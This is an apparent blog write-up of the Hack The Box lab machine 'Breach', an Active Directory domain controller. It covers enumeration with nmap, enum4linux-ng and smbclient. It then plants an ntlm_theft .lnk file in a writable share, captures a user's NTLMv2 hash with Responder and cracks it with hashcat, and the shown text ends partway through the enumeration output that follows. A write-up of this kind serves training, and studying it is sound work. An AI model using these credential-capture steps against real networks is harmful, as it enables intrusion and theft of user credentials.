---
layout: posts
title: "HTB — Breach Writeup"
date: 2026-02-25
tags: [htb, writeup, windows, web, active directory]
categories: [ctf]
---

## Overview

- **Machine:** Breach
- **Platform:** Hack The Box
- **OS:** Windows
- **Difficulty:** Medium

Breach is a medium-difficulty machine that requires a solid understanding of Active Directory fundamentals. It’s a very enjoyable box that showcases several common misconfigurations within an AD environment. Although classified as medium, it serves as an excellent learning platform for building and reinforcing your Active Directory basics.

---

## Initial Enumeration

### Nmap Scan

```bash
Nmap scan report for 10.129.6.251
Host is up (0.031s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-24 17:29:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2026-02-23T17:23:47
|_Not valid after:  2026-08-25T17:23:47
|_ssl-date: 2026-02-24T17:31:12+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-24T17:30:33+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49922/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-24T17:30:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 341.39 seconds
```

As expected with an Active Directory machine, we see several open ports related to core services like LDAP, SMB, RPC, Kerberos, and DNS.

One interesting detail is port 80, which isn’t always present on domain controllers and could provide an additional attack surface.

Before starting enumeration, I’ll add the domain name and hostname to my /etc/hosts file to ensure proper name resolution.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ cat /etc/hosts           
127.0.0.1 localhost
127.0.1.1 kali 
10.129.6.251 breach.vl BREACH BREACHDC.breach.vl BREACHDC
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

### Enum4linux

I always like to start with an initial enum4linux-ng scan without credentials, sometimes you can grab some low-hanging fruit right away.

Even if anonymous access is limited, enum4linux-ng can still provide useful information, such as the domain SID, basic domain details, SMB configuration, and sometimes even user or share information. It’s a quick win and helps build a clearer picture of the environment before moving into authenticated enumeration.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ enum4linux-ng breach.vl
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... breach.vl
[*] Username ......... ''
[*] Random Username .. 'eaqlxhwt'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ==================================
|    Listener Scan on breach.vl    |
 ==================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =================================================
|    Domain Information via LDAP for breach.vl    |
 =================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: breach.vl

 ========================================================
|    NetBIOS Names and Workgroup/Domain for breach.vl    |
 ========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ======================================
|    SMB Dialect Check on breach.vl    |
 ======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.02: true                                                                                                                                                                                                                            
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
SMB signing required: true                                                                                                                                                                                                                  

 ========================================================
|    Domain Information via SMB session for breach.vl    |
 ========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: BREACHDC                                                                                                                                                                                                             
NetBIOS domain name: BREACH                                                                                                                                                                                                                 
DNS domain: breach.vl                                                                                                                                                                                                                       
FQDN: BREACHDC.breach.vl                                                                                                                                                                                                                    
Derived membership: domain member                                                                                                                                                                                                           
Derived domain: BREACH                                                                                                                                                                                                                      

 ======================================
|    RPC Session Check on breach.vl    |
 ======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'eaqlxhwt', password ''
[H] Rerunning enumeration with user 'eaqlxhwt' might give more results

 ================================================
|    Domain Information via RPC for breach.vl    |
 ================================================
[+] Domain: BREACH
[+] Domain SID: S-1-5-21-2330692793-3312915120-706255856
[+] Membership: domain member

 ============================================
|    OS Information via RPC for breach.vl    |
 ============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS version: '10.0'                                                                                                                                                                                                                          
OS release: ''                                                                                                                                                                                                                              
OS build: '20348'                                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
Native LAN manager: not supported                                                                                                                                                                                                           
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

 ==================================
|    Users via RPC on breach.vl    |
 ==================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ===================================
|    Groups via RPC on breach.vl    |
 ===================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ===================================
|    Shares via RPC on breach.vl    |
 ===================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ======================================
|    Policies via RPC for breach.vl    |
 ======================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ======================================
|    Printers via RPC for breach.vl    |
 ======================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 11.38 seconds
```

Nothing quite interesting here, I'll take note of the SID and move on.

### Port 80

I decided to start with port 80, as it might be the most complex.

Initially, we have a default IIS page, I'll run a dirbuster scan in the background and look for virtual hosts.

<p align="center">
  <a href="/assets/images/breach/Captura1.png" class="glightbox">
    <img src="/assets/images/breach/Captura1.png" width="700">
  </a>
</p>

Dirbuster didn't show anything of interest.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ dirb http://breach.vl/   

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 25 11:27:51 2026
URL_BASE: http://breach.vl/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://breach.vl/ ----
                                                                                                                                                                                                                                           
-----------------
END_TIME: Wed Feb 25 11:30:41 2026
DOWNLOADED: 4612 - FOUND: 0
```

And no virtual hosts were discovered.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ ffuf -u http://breach.vl -H "Host: FUZZ.breach.vl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 703 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://breach.vl
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.breach.vl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 703
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 1298 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

I'll stop with port 80 there and move on. If necessary, I can always come back and dig deeper.

### Port 445

Next, I’ll try authenticating to the domain using Guest or null credentials. For this, I’ll use smbclient, since anonymous SMB access can sometimes reveal useful shares or sensitive information.

If null or Guest access is allowed, it could give us valuable insight into users, files, or even configuration details that help move us forward.

Null session authenticate and we can list the shares in the SMB.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ smbclient -N -L //breach.vl          

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        share           Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to breach.vl failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Guest credentials also work and we can use nxc to list the readable or writables shares as Guest.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ nxc smb breach.vl -u 'Guest' -p '' --shares
SMB         10.129.8.90     445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.8.90     445    BREACHDC         [+] breach.vl\Guest: 
SMB         10.129.8.90     445    BREACHDC         [*] Enumerated shares
SMB         10.129.8.90     445    BREACHDC         Share           Permissions     Remark
SMB         10.129.8.90     445    BREACHDC         -----           -----------     ------
SMB         10.129.8.90     445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.8.90     445    BREACHDC         C$                              Default share
SMB         10.129.8.90     445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.8.90     445    BREACHDC         NETLOGON                        Logon server share 
SMB         10.129.8.90     445    BREACHDC         share           READ,WRITE      
SMB         10.129.8.90     445    BREACHDC         SYSVOL                          Logon server share 
SMB         10.129.8.90     445    BREACHDC         Users           READ
```

### share and users shares

Starting with the share named share, it's quite interesting that we can write to it. Looking at it's contents, I can see three users which I'll note. `Recurse on` will allow me to go through the share quicker.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ smbclient -U 'Guest' //breach.vl/share   
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 25 11:37:34 2026
  ..                                DHS        0  Tue Sep  9 06:35:32 2025
  finance                             D        0  Thu Feb 17 06:19:34 2022
  software                            D        0  Thu Feb 17 06:19:12 2022
  transfer                            D        0  Mon Sep  8 06:13:44 2025

                7863807 blocks of size 4096. 1369552 blocks available
smb: \> recurse on
smb: \> ls
  .                                   D        0  Wed Feb 25 11:37:34 2026
  ..                                DHS        0  Tue Sep  9 06:35:32 2025
  finance                             D        0  Thu Feb 17 06:19:34 2022
  software                            D        0  Thu Feb 17 06:19:12 2022
  transfer                            D        0  Mon Sep  8 06:13:44 2025

\finance
  .                                   D        0  Thu Feb 17 06:19:34 2022
  ..                                  D        0  Wed Feb 25 11:37:34 2026

\software
  .                                   D        0  Thu Feb 17 06:19:12 2022
  ..                                  D        0  Wed Feb 25 11:37:34 2026

\transfer
  .                                   D        0  Mon Sep  8 06:13:44 2025
  ..                                  D        0  Wed Feb 25 11:37:34 2026
  claire.pope                         D        0  Thu Feb 17 06:21:35 2022
  diana.pope                          D        0  Thu Feb 17 06:21:19 2022
  julia.wong                          D        0  Wed Apr 16 20:38:12 2025

\transfer\claire.pope
NT_STATUS_ACCESS_DENIED listing \transfer\claire.pope\*

\transfer\diana.pope
NT_STATUS_ACCESS_DENIED listing \transfer\diana.pope\*

\transfer\julia.wong
NT_STATUS_ACCESS_DENIED listing \transfer\julia.wong\*
smb: \> 
```

There's nothing of interest with our read permissions, before trying anything with the write permissions, I'll check the other share.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/smb]
└─$ smbclient -U 'Guest' //breach.vl/Users
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                  DR        0  Thu Feb 17 08:12:16 2022
  ..                                DHS        0  Tue Sep  9 06:35:32 2025
  Default                           DHR        0  Thu Feb 10 04:10:33 2022
  desktop.ini                       AHS      174  Sat May  8 04:18:31 2021
  Public                             DR        0  Tue Sep 14 23:08:59 2021

\Default
  .                                 DHR        0  Thu Feb 10 04:10:33 2022
  ..                                 DR        0  Thu Feb 17 08:12:16 2022
  AppData                            DH        0  Thu Aug 19 02:45:22 2021
  Desktop                            DR        0  Thu Aug 19 02:24:36 2021
  Documents                          DR        0  Wed Feb  9 19:59:34 2022
  Downloads                          DR        0  Sat May  8 04:20:24 2021
  Favorites                          DR        0  Sat May  8 04:20:24 2021
  Links                              DR        0  Sat May  8 04:20:24 2021
  Music                              DR        0  Sat May  8 04:20:24 2021
  NTUSER.DAT                        AHn   524288  Thu Feb 17 10:38:01 2022
  ntuser.ini                       AHSn       20  Thu Aug 19 02:45:22 2021
  Pictures                           DR        0  Sat May  8 04:20:24 2021
  Saved Games                        Dn        0  Sat May  8 04:20:24 2021
  Videos                             DR        0  Sat May  8 04:20:24 2021

---SNIP---
...
---SNIP---
\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  .                                   D        0  Thu Feb 10 04:11:10 2022
  ..                                  D        0  Tue Sep 14 23:09:20 2021
  setwallpaper.lnk                    A     1363  Wed Apr 16 19:43:57 2025

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools
  .                                  DR        0  Sat May  8 04:20:26 2021
  ..                                  D        0  Tue Sep 14 23:09:20 2021
  Administrative Tools.lnk            A     1281  Sat May  8 04:14:58 2021
  Command Prompt.lnk                  A     1142  Sat May  8 04:14:16 2021
  computer.lnk                        A      335  Sat May  8 04:14:58 2021
  Control Panel.lnk                   A      405  Sat May  8 04:14:58 2021
  Desktop.ini                       AHS      934  Sat May  8 04:18:35 2021
  File Explorer.lnk                   A      407  Sat May  8 04:14:58 2021
  Run.lnk                             A      409  Sat May  8 04:14:58 2021
...
```

The other share goes pretty deep, and it looks like it contains the default user configuration. It seems to be the template Windows uses when creating new user profiles. I took a quick look at it but it seemed more like a rabbit hole.

### Julia credentials

Going back to the first share, whenever I see a writable SMB share, one of the first things I try is stealing NTLM credentials.

The idea is simple: create a file (like .lnk, .ini, .library-ms, .scf, etc.) that contains a UNC path pointing to my IP address. If Windows automatically processes or renders that file in Explorer, it will try to resolve the UNC path.

When that happens, the machine attempts to authenticate to my SMB server, and with a tool like Responder, I can capture the NTLM challenge-response for offline cracking or relay attacks.

For this, we'll use a very reliable tool named [ntlm_theft](https://github.com/Greenwolf/ntlm_theft), which automates most of this process.

The usage is super simple, clone the repository and run the python script.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach]
└─$ git clone https://github.com/Greenwolf/ntlm_theft.git
Cloning into 'ntlm_theft'...
remote: Enumerating objects: 151, done.
remote: Counting objects: 100% (38/38), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 151 (delta 31), reused 24 (delta 24), pack-reused 113 (from 1)
Receiving objects: 100% (151/151), 2.12 MiB | 8.03 MiB/s, done.
Resolving deltas: 100% (73/73), done.
```

I'll create a .lnk file for this test.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/ntlm_theft]
└─$ python ntlm_theft.py -g lnk -s 10.10.14.16 -f test
/home/kali/hackthebox/breach/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: test/test.lnk (BROWSE TO FOLDER)
Generation Complete.
```

Alternatively, if it’s unclear which file extensions are actually being rendered, we can use the `-g all` option. This tells the tool to generate files for every supported extension.

That way, we cover all possible triggers. We simply drop the full batch of generated files into the writable SMB share and wait and if Windows processes any of them automatically, we should receive an NTLM authentication attempt. 

We now put the files inside the smb and set responder on.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/ntlm_theft/test]
└─$ smbclient -U 'Guest' //breach.vl/share     
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 25 11:37:34 2026
  ..                                DHS        0  Tue Sep  9 06:35:32 2025
  finance                             D        0  Thu Feb 17 06:19:34 2022
  software                            D        0  Thu Feb 17 06:19:12 2022
  transfer                            D        0  Mon Sep  8 06:13:44 2025

                7863807 blocks of size 4096. 1515754 blocks available
smb: \> cd transfer
smb: \transfer\> put test.lnk
putting file test.lnk as \transfer\test.lnk (21.6 kb/s) (average 21.6 kb/s)
smb: \transfer\> 
```

Inmmediately, we get a request back.

```bash
┌──(kali㉿kali)-[~/hackthebox/breach/ntlm_theft/test]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

---SNIP---
...
---SNIP---
[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.8.90
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:f0e657876e73a278:309F791A2FA28445ED7F4A47D370B3DA:01010000000000000037D73555A6DC0125EBEF6E1EF9541700000000020008004F004E003200330001001E00570049004E002D005700480059003600370059005A00590031004100330004003400570049004E002D005700480059003600370059005A0059003100410033002E004F004E00320033002E004C004F00430041004C00030014004F004E00320033002E004C004F00430041004C00050014004F004E00320033002E004C004F00430041004C00070008000037D73555A6DC01060004000200000008003000300000000000000001000000002000005EFB7EEA482AFEBE7EE3C57C9B25FE1CC0A3E36ED94816C0D2B843D3A204D1400A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000                                                                                                                                                                                                                           
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
[*] Skipping previously captured hash for BREACH\Julia.Wong
```

I'll copy the hash and try to crack it with hashcat.

```powershell
PS Z:\escritorio\hashcat> .\hashcat.exe .\Place_your_hashes_here.txt .\rockyou.txt --force
hashcat (v6.2.6) starting in autodetect mode
---SNIP---
...
---SNIP---
* Bytes.....: 139921497
* Keyspace..: 14344384

JULIA.WONG::BREACH:f0e657876e73a278:309f791a2fa28445ed7f4a47d370b3da:01010000000000000037d73555a6dc0125ebef6e1ef9541700000000020008004f004e003200330001001e00570049004e002d005700480059003600370059005a00590031004100330004003400570049004e002d005700480059003600370059005a0059003100410033002e004f004e00320033002e004c004f00430041004c00030014004f004e00320033002e004c004f00430041004c00050014004f004e00320033002e004c004f00430041004c00070008000037d73555a6dc01060004000200000008003000300000000000000001000000002000005efb7eea482afebe7ee3c57c9b25fe1cc0a3e36ed94816c0d2b843d3a204d1400a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310036000000000000000000:Computer1
```

After just some seconds, the hash cracked succesfully and we have the credentials of julia.wong.

### Lateral Movement

First thing I'll check with the newly obtained credentials is to run another enum4linux scan, as well as re-check the shares in smb. While we do this, it's good to let Bloodhound collect the data in the background.

<details>
<summary><strong>enum4linux-ng Output</strong></summary>

<pre><code>
#
┌──(kali㉿kali)-[~/hackthebox/breach/ntlm_theft/test]
└─$ enum4linux-ng -u julia.wong -p 'Computer1' breach.vl
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... breach.vl
[*] Username ......... 'julia.wong'
[*] Random Username .. 'vavofpix'
[*] Password ......... 'Computer1'
[*] Timeout .......... 5 second(s)

 ==================================
|    Listener Scan on breach.vl    |
 ==================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =================================================
|    Domain Information via LDAP for breach.vl    |
 =================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: breach.vl

 ========================================================
|    NetBIOS Names and Workgroup/Domain for breach.vl    |
 ========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ======================================
|    SMB Dialect Check on breach.vl    |
 ======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.02: true                                                                                                                                                                                                                            
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
SMB signing required: true                                                                                                                                                                                                                  

 ========================================================
|    Domain Information via SMB session for breach.vl    |
 ========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: BREACHDC                                                                                                                                                                                                             
NetBIOS domain name: BREACH                                                                                                                                                                                                                 
DNS domain: breach.vl                                                                                                                                                                                                                       
FQDN: BREACHDC.breach.vl                                                                                                                                                                                                                    
Derived membership: domain member                                                                                                                                                                                                           
Derived domain: BREACH                                                                                                                                                                                                                      

 ======================================
|    RPC Session Check on breach.vl    |
 ======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for user session
[+] Server allows session using username 'julia.wong', password 'Computer1'
[*] Check for random user
[+] Server allows session using username 'vavofpix', password 'Computer1'
[H] Rerunning enumeration with user 'vavofpix' might give more results

 ================================================
|    Domain Information via RPC for breach.vl    |
 ================================================
[+] Domain: BREACH
[+] Domain SID: S-1-5-21-2330692793-3312915120-706255856
[+] Membership: domain member

 ============================================
|    OS Information via RPC for breach.vl    |
 ============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS version: '10.0'                                                                                                                                                                                                                          
OS release: ''                                                                                                                                                                                                                              
OS build: '20348'                                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
Native LAN manager: not supported                                                                                                                                                                                                           
Platform id: '500'                                                                                                                                                                                                                          
Server type: '0x80102f'                                                                                                                                                                                                                     
Server type string: Wk Sv Sql PDC Tim NT                                                                                                                                                                                                    

 ==================================
|    Users via RPC on breach.vl    |
 ==================================
[*] Enumerating users via 'querydispinfo'
[+] Found 14 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 14 user(s) via 'enumdomusers'
[+] After merging user results we have 14 user(s) total:
'1105':                                                                                                                                                                                                                                     
  username: Claire.Pope                                                                                                                                                                                                                     
  name: Claire Pope                                                                                                                                                                                                                         
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1106':                                                                                                                                                                                                                                     
  username: Julia.Wong                                                                                                                                                                                                                      
  name: Julia Wong                                                                                                                                                                                                                          
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1107':                                                                                                                                                                                                                                     
  username: Hilary.Reed                                                                                                                                                                                                                     
  name: Hilary Reed                                                                                                                                                                                                                         
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1108':                                                                                                                                                                                                                                     
  username: Diana.Pope                                                                                                                                                                                                                      
  name: Diana Pope                                                                                                                                                                                                                          
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1109':                                                                                                                                                                                                                                     
  username: Jasmine.Price                                                                                                                                                                                                                   
  name: Jasmine Price                                                                                                                                                                                                                       
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1110':                                                                                                                                                                                                                                     
  username: George.Williams                                                                                                                                                                                                                 
  name: George Williams                                                                                                                                                                                                                     
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1111':                                                                                                                                                                                                                                     
  username: Lawrence.Kaur                                                                                                                                                                                                                   
  name: Lawrence Kaur                                                                                                                                                                                                                       
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1112':                                                                                                                                                                                                                                     
  username: Jasmine.Slater                                                                                                                                                                                                                  
  name: Jasmine Slater                                                                                                                                                                                                                      
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1113':                                                                                                                                                                                                                                     
  username: Hugh.Watts                                                                                                                                                                                                                      
  name: Hugh Watts                                                                                                                                                                                                                          
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1114':                                                                                                                                                                                                                                     
  username: Christine.Bruce                                                                                                                                                                                                                 
  name: Christine Bruce                                                                                                                                                                                                                     
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'1115':                                                                                                                                                                                                                                     
  username: svc_mssql                                                                                                                                                                                                                       
  name: svc_mssql                                                                                                                                                                                                                           
  acb: '0x00000210'                                                                                                                                                                                                                         
  description: (null)                                                                                                                                                                                                                       
'500':                                                                                                                                                                                                                                      
  username: Administrator                                                                                                                                                                                                                   
  name: (null)                                                                                                                                                                                                                              
  acb: '0x00000210'                                                                                                                                                                                                                         
  description: Built-in account for administering the computer/domain                                                                                                                                                                       
'501':                                                                                                                                                                                                                                      
  username: Guest                                                                                                                                                                                                                           
  name: (null)                                                                                                                                                                                                                              
  acb: '0x00000214'                                                                                                                                                                                                                         
  description: Built-in account for guest access to the computer/domain                                                                                                                                                                     
'502':                                                                                                                                                                                                                                      
  username: krbtgt                                                                                                                                                                                                                          
  name: (null)                                                                                                                                                                                                                              
  acb: '0x00020011'                                                                                                                                                                                                                         
  description: Key Distribution Center Service Account                                                                                                                                                                                      

 ===================================
|    Groups via RPC on breach.vl    |
 ===================================
[*] Enumerating local groups
[+] Found 6 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 28 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 16 group(s) via 'enumdomgroups'
[+] After merging groups results we have 50 group(s) total:
'1101':                                                                                                                                                                                                                                     
  groupname: DnsAdmins                                                                                                                                                                                                                      
  type: local                                                                                                                                                                                                                               
'1102':                                                                                                                                                                                                                                     
  groupname: DnsUpdateProxy                                                                                                                                                                                                                 
  type: domain                                                                                                                                                                                                                              
'1103':                                                                                                                                                                                                                                     
  groupname: SQLServer2005SQLBrowserUser$BREACHDC                                                                                                                                                                                           
  type: local                                                                                                                                                                                                                               
'1104':                                                                                                                                                                                                                                     
  groupname: staff                                                                                                                                                                                                                          
  type: domain                                                                                                                                                                                                                              
'498':                                                                                                                                                                                                                                      
  groupname: Enterprise Read-only Domain Controllers                                                                                                                                                                                        
  type: domain                                                                                                                                                                                                                              
'512':                                                                                                                                                                                                                                      
  groupname: Domain Admins                                                                                                                                                                                                                  
  type: domain                                                                                                                                                                                                                              
'513':                                                                                                                                                                                                                                      
  groupname: Domain Users                                                                                                                                                                                                                   
  type: domain                                                                                                                                                                                                                              
'514':                                                                                                                                                                                                                                      
  groupname: Domain Guests                                                                                                                                                                                                                  
  type: domain                                                                                                                                                                                                                              
'515':                                                                                                                                                                                                                                      
  groupname: Domain Computers                                                                                                                                                                                                               
  type: domain                                                                                                                                                                                                                              
'516':                                                                                                                                                                                                                                      
  groupname: Domain Controllers                                                                                                                                                                                                             
  type: domain                                                                                                                                                                                                                              
'517':                                                                                                                                                                                                                                      
